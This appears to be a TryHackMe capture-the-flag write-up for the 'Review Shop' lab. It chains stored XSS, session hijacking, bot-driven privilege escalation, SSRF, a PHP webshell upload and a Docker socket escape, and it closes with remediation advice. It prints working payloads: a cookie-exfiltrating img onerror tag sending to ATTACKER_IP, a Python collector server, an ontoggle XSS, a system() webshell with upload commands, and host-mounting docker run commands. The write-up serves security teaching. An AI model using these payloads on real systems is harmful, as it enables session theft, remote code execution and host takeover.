# TryHackMe — Review Shop | Full Chain: XSS → Privilege Escalation → SSRF → Docker Escape

> **Difficulty:** Hard  
> **Date:** July 2026  
> **Author:** Artem  
> **Tags:** `XSS` `Session Hijacking` `SSRF` `File Upload` `Docker Escape` `Privilege Escalation`

---

## Table of Contents

1. [Overview](#overview)
2. [Attack Chain Summary](#attack-chain-summary)
3. [Phase 1 — Stored XSS & Session Hijacking](#phase-1--stored-xss--session-hijacking)
4. [Phase 2 — Privilege Escalation (mod → admin)](#phase-2--privilege-escalation-mod--admin)
5. [Phase 3 — SSRF via Feature Parameter](#phase-3--ssrf-via-feature-parameter)
6. [Phase 4 — File Upload to RCE](#phase-4--file-upload-to-rce)
7. [Phase 5 — Docker Socket Escape](#phase-5--docker-socket-escape)
8. [Findings Summary](#findings-summary)
9. [Flags](#flags)
10. [Remediation](#remediation)

---

## Overview

Review Shop is a multi-stage web application challenge that chains together six distinct vulnerability classes to achieve full host compromise. The application is a PHP-based review platform running inside a Docker container on an Ubuntu host.

**Target:** `http://review.thm`  
**Architecture:** Apache/2.4.41 (Ubuntu) → PHP application → Docker container (phpvulnerable) → Host

---

## Attack Chain Summary

```
Stored XSS (contact form)
  └─► Session Hijacking (mod account)
        └─► Broken Access Control (admin_view.php accessible to mod)
              └─► Client-side Filter Bypass (chat.php — curl bypasses JS filter)
                    └─► Stored XSS in Chat (ontoggle event bypass)
                          └─► Privilege Escalation (mod → admin via bot)
                                └─► Information Disclosure (/mail/dump.txt)
                                      └─► SSRF (feature parameter → finance.php)
                                            └─► File Upload → RCE (shell.php in uploads/)
                                                  └─► Docker Socket Escape → Host Root
```

---

## Phase 1 — Stored XSS & Session Hijacking

### 1.1 Reconnaissance

The application has a **Contact Us** form at `/contact.php` that accepts user input (Name, Phone, Message). The submitted data is stored and later rendered in `/admin_view.php` for administrative review.

### 1.2 Identifying the Vulnerability (WSTG-CLNT-01 / WSTG-INPV-02)

The message field has **zero output encoding** — user input is rendered directly into HTML without `htmlspecialchars()` or any server-side sanitization:

```html
<p><strong>Message:</strong><br>
  <!-- User input rendered raw here -->
</p>
```

### 1.3 Exploitation — Cookie Exfiltration

A Python HTTP collector was set up to receive stolen cookies:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import datetime

class Collector(BaseHTTPRequestHandler):
    def do_GET(self):
        q = parse_qs(urlparse(self.path).query)
        data = q.get("c", [""])[0]
        if data:
            ts = datetime.datetime.now().isoformat()
            line = f"[{ts}] {self.client_address[0]} -> {data}\n"
            print(line, end="")
            with open("collected.log", "a") as f:
                f.write(line)
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.end_headers()
        # 1x1 transparent GIF
        self.wfile.write(bytes.fromhex(
            "47494638396101000100800000ffffff00000021f90401000000"
            "002c00000000010001000002024401003b"))

    def log_message(self, *args):
        pass

if __name__ == "__main__":
    HTTPServer(("0.0.0.0", 8000), Collector).serve_forever()
```

The XSS payload was injected via the contact form message field:

```html
<img src=x onerror="new Image().src='http://ATTACKER_IP:4442/?c='+encodeURIComponent(document.cookie)">
```

**Mechanism:** The `<img>` tag attempts to load resource `x`, fails, triggers `onerror`. The handler creates a new Image object whose `src` initiates an out-of-band GET request carrying the victim's cookies in the query string. `encodeURIComponent` prevents cookie special characters (`;`, `=`) from breaking the URL.

### 1.4 Session Hijacking Confirmation

The stolen `PHPSESSID` was used to access the mod account:

```bash
curl -i -b 'PHPSESSID=REDACTED' http://review.thm/dashboard.php
```

**Result:** `HTTP/1.1 200 OK` — authenticated as `mod`.

### 1.5 Key Observations

| Finding | Detail |
|---|---|
| `HttpOnly` flag | **Missing** — `document.cookie` can read PHPSESSID |
| `Secure` flag | **Missing** — cookie transmitted over HTTP |
| `SameSite` attribute | **Missing** — no CSRF protection at cookie level |
| Session binding | **None** — no IP/User-Agent validation |

---

## Phase 2 — Privilege Escalation (mod → admin)

### 2.1 Dashboard Enumeration

Under the mod session, `/dashboard.php` revealed a user table:

| ID | Username | Role |
|----|----------|------|
| 2  | admin    | admin |
| 3  | mod      | mod |

### 2.2 Broken Access Control (WSTG-ATHZ-02)

`/admin_view.php` (titled "Feedback List - **Admin**") was accessible to `mod` without restriction — no role check on this endpoint.

### 2.3 Settings Page Analysis

`/settings.php` exposed two critical forms:

**Change Password** — POST to `/update_password.php`:
- CSRF token validated ✅
- No current password required ❌

**Promote Co-Admin** — GET to `/promote_coadmin.php`:
- CSRF token **not validated** ❌
- State-changing operation via GET ❌
- Only role check (must be admin) ✅

### 2.4 Chat XSS — Client-side Filter Bypass

`/chat.php` had a JavaScript-based input filter blocking keywords:

```javascript
const dangerous = [
    "<script>", "</script>", "onerror", "onload", "fetch",
    "ajax", "xmlhttprequest", "eval", "document.cookie", "window.location"
];
```

**Bypass method:** Sending via `curl` completely bypasses the client-side JavaScript filter. Additionally, `ontoggle` was not in the blocklist.

### 2.5 Privilege Escalation via Bot

The admin bot periodically reads chat messages. The following payload was injected:

```bash
curl -i \
  -b 'PHPSESSID=REDACTED' \
  -X POST \
  --data-urlencode 'message=<details open ontoggle="new Image().src=`/promote_coadmin.php?username=mod`">' \
  'http://review.thm/chat.php'
```

**Mechanism:** `<details open ontoggle=...>` automatically fires the `ontoggle` event when the browser renders the opened `<details>` element — no user interaction required. When the admin bot reads the chat, the request to `/promote_coadmin.php?username=mod` is made with the bot's admin session cookies, passing the role check.

**Result:** `mod` role elevated to `admin`. Second flag appeared in the navbar.

> ⚠️ **Note:** The role promotion was not persistent across sessions — logging out reset the role. The flag had to be captured within the same session.

---

## Phase 3 — SSRF via Feature Parameter

### 3.1 Information Disclosure (WSTG-INFO-05)

A publicly accessible file at `/mail/dump.txt` leaked internal infrastructure details:

```
From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

The Finance panel (/finance.php) is hosted on the internal 192.x network,
and the Lottery panel (/lottery.php) resides on the same segment.

Access is protected with a completed 8-character alphanumeric password
(S6****5j), in order to restrict exposure.
```

### 3.2 SSRF via Feature Parameter

The admin dashboard contained a `<select>` dropdown with `enctype="multipart/form-data"`:

```html
<form method="post" enctype="multipart/form-data">
    <select name="feature" onchange="this.form.submit()">
        <option value="lottery.php">Lottery Feature</option>
    </select>
</form>
```

The server-side code used the `feature` parameter to fetch internal resources (likely via `include()` or `file_get_contents()`):

```bash
curl -s -b 'PHPSESSID=REDACTED' \
  -X POST -d "feature=finance.php" \
  'http://review.thm/dashboard.php'
```

**Key insight:** Passing full URLs like `http://192.168.1.1/finance.php` resulted in the path being treated as `/http://192.168.1.1/finance.php` — the server prepended the internal base URL. Only the filename was needed.

### 3.3 Finance Panel — Client-side Authentication

The Finance Panel was protected by a JavaScript password overlay. The password was **hardcoded in obfuscated JS** and also leaked in `/mail/dump.txt`:

```javascript
function _0x4d81() {
    const _0x1abde2 = ['...', 'S6****5j'];  // Password in plaintext
    ...
}
```

The actual financial data and upload form were already present in the HTML, hidden behind a CSS `display: none` — no server-side authentication at all.

---

## Phase 4 — File Upload to RCE

### 4.1 Upload Discovery

The Finance Panel contained an unrestricted file upload form:

```html
<h3>📤 Upload Latest Investor Details</h3>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="investor_file" required>
    <button type="submit">Upload</button>
</form>
```

### 4.2 Webshell Upload

A PHP webshell was uploaded through the SSRF + upload chain:

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

curl -s -b 'PHPSESSID=REDACTED' \
  -X POST \
  -F "feature=finance.php" \
  -F "investor_file=@/tmp/shell.php;filename=shell.php;type=image/jpeg" \
  'http://review.thm/dashboard.php'
```

**Response:**
```
✅ File uploaded successfully in uploads folder!
Path: uploads/shell.php
```

### 4.3 RCE Confirmation

```bash
curl -s -b 'PHPSESSID=REDACTED' \
  -X POST \
  -F "feature=uploads/shell.php?cmd=id" \
  'http://review.thm/dashboard.php'
```

**Result:** `uid=0(root) gid=0(root) groups=0(root)`

### 4.4 Important Observations

| Observation | Detail |
|---|---|
| `.php` extension allowed | No extension whitelist |
| `.phtml` uploaded but didn't execute | PHP disabled for `.phtml` in uploads dir |
| `.php` extension executed | Standard PHP handler active for `.php` files |
| Path traversal (`../`) | Stripped by server — files always land in `uploads/` |
| Running as root | Container misconfiguration |

---

## Phase 5 — Docker Socket Escape

### 5.1 Container Detection

Several indicators confirmed we were inside a Docker container:

```bash
# Overlay filesystem
$ mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/...)

# Container IP on internal bridge
$ hostname -I
192.168.100.10

# No root.txt in /root/
$ ls -la /root/
.bashrc  .profile  .ssh/   # Empty .ssh, no flag
```

### 5.2 Docker Socket Discovery

```bash
$ ls -la /var/run/docker.sock
srw-rw---- 1 root 121 0 Jul 19 21:53 /var/run/docker.sock
```

The Docker socket was mounted into the container — this allows full control over the Docker daemon on the host.

### 5.3 Available Images

```bash
$ docker images
REPOSITORY      TAG       IMAGE ID       CREATED         SIZE
phpvulnerable   latest    d0bf58293d3b   13 months ago   926MB
php             8.1-cli   0ead645a9bc2   16 months ago   527MB
```

### 5.4 Host Filesystem Access

Using the `php:8.1-cli` image to create a new container with the host's root filesystem mounted:

```bash
$ docker run --rm -v /:/mnt php:8.1-cli ls -la /mnt/root/
total 68
drwxr-x--- 12 root root 4096 Jun  4  2025 .
-rw-r--r--  1 root root   20 Jun  4  2025 flag.txt
drwx------  7 root root 4096 Feb  2  2024 root
...
```

### 5.5 Root Flag

```bash
$ docker run --rm -v /:/mnt php:8.1-cli cat /mnt/root/flag.txt
THM{r]REDACTED[}
```

### 5.6 Additional Findings on Host

```bash
$ docker run --rm -v /:/mnt php:8.1-cli cat /mnt/root/root/creds.txt
MYSQL root: REDACTED
```

---

## Findings Summary

| # | Severity | Finding | WSTG ID | Impact |
|---|----------|---------|---------|--------|
| 1 | **Critical** | Stored XSS — No Output Encoding | CLNT-01, INPV-02 | Session hijacking, account takeover |
| 2 | **Critical** | Session Cookie Missing HttpOnly | SESS-02 | Cookie theft via XSS |
| 3 | **Critical** | File Upload → Remote Code Execution | BUSL-08 | Arbitrary command execution as root |
| 4 | **Critical** | Docker Socket Mounted in Container | — | Full host compromise |
| 5 | **High** | SSRF via Feature Parameter | SSRF | Access to internal services |
| 6 | **High** | Privilege Escalation via XSS Chain | ATHZ-02 | mod → admin role elevation |
| 7 | **High** | CSRF Not Validated on promote_coadmin | SESS-05 | State change without token validation |
| 8 | **High** | State-Changing GET Request | BUSL-01 | CSRF via `<img>` tag |
| 9 | **Medium** | Broken Access Control (admin_view) | ATHZ-02 | mod accessing admin-only pages |
| 10 | **Medium** | Plaintext Credentials in dump.txt | INFO-05 | Internal password exposure |
| 11 | **Medium** | Client-Side Only Input Validation | CLNT-01 | Bypassable via curl/proxy |
| 12 | **Medium** | Client-Side Only Authentication (Finance) | ATHN-04 | Password in JavaScript source |
| 13 | **Medium** | Password Change Without Current Password | ATHN-04 | Account takeover via XSS |
| 14 | **Low** | Plaintext Credentials on Host | — | MySQL root password in /root/root/creds.txt |

---

## Flags

| Flag | Phase | Method |
|------|-------|--------|
| `THM{M0d██████d007}` | Session Hijacking | Stored XSS → Cookie theft → mod session |
| `THM{Adm██████007}` | Privilege Escalation | Chat XSS → Bot executes promote endpoint |
| `THM{root██████D0n3}` | Docker Escape | Upload shell → Docker socket → Mount host |

---

## Remediation

### XSS Prevention
- Apply **context-aware output encoding** on all user-supplied data (`htmlspecialchars()` with `ENT_QUOTES` for HTML context)
- Implement **Content Security Policy** (CSP) with `script-src` excluding `unsafe-inline`
- Set `HttpOnly`, `Secure`, and `SameSite=Strict` on all session cookies

### Access Control
- Enforce **server-side role checks** on every privileged endpoint
- Never use GET for state-changing operations — use POST with CSRF tokens
- Validate CSRF tokens server-side on all state-changing endpoints

### File Upload Hardening
- Implement a **strict allowlist** for file extensions (e.g., `.csv`, `.xlsx` only)
- Store uploaded files **outside the web root**
- Disable PHP execution in upload directories via server configuration
- Validate file content (magic bytes), not just extension or MIME type

### SSRF Prevention
- Use an **allowlist** for the `feature` parameter — never pass user input to `include()` or `file_get_contents()`
- Validate and sanitize all server-side URL construction

### Docker Security
- **Never mount** `/var/run/docker.sock` into application containers
- Run containers as **non-root** users
- Apply the **principle of least privilege** — drop all unnecessary capabilities
- Use **read-only root filesystems** where possible

### Credential Management
- Never store passwords in plaintext files
- Use a secrets management solution (Vault, AWS Secrets Manager)
- Remove sensitive files from publicly accessible directories (`/mail/dump.txt`)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| curl | HTTP requests, cookie injection, file upload |
| Python3 | Cookie collector server |
| Burp Suite | Request interception and analysis |
| Docker CLI | Container escape via socket |

---

> **Disclaimer:** This writeup is for educational purposes only. All testing was performed on a legitimate TryHackMe lab environment with proper authorization.
